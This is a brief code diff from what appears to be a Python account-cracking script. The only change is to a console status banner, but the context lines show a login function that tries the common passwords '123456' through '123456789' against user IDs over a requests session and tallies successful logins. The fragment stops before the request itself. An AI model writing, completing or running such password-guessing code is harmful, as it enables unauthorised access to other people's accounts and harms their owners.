@@ -405,7 +405,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r {W}+({X} RAJA OK ID-M1 {W}) ({rad}{loop}{W}) ({X}OK{W}) ({rad}{len(oks)}{W})")
+        sys.stdout.write(f"\r {W}+({X} GAB HNDSM OK ID-M1 {W}) ({rad}{loop}{W}) ({X}OK{W}) ({rad}{len(oks)}{W})")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
